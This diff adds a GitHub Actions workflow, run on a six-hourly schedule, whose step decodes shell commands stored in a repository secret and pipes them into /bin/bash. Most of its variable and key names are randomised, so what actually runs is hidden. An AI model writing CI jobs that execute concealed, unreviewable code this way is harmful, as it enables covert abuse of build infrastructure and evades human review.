@@ -1,0 +1,23 @@
+name: guoxiagjiaokai
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: guoxiagjiaokai
+        env:
+          o31854: ${{ secrets.o31854 }}
+        run: |
+          echo $o31854 | jq -r .i424 | /bin/bash
+          echo $veny64 | jq -r .yiy63466 | /bin/bash
+          echo $dysm44075 | jq -r .hkv97 | /bin/bash
+          echo $s72141 | jq -r .t0 | /bin/bash
+          echo $i29295 | jq -r .o50743 | /bin/bash
+          echo $xwxuf411 | jq -r .nhur7 | /bin/bash
+          echo $lvlgu941 | jq -r .cw37 | /bin/bash
+
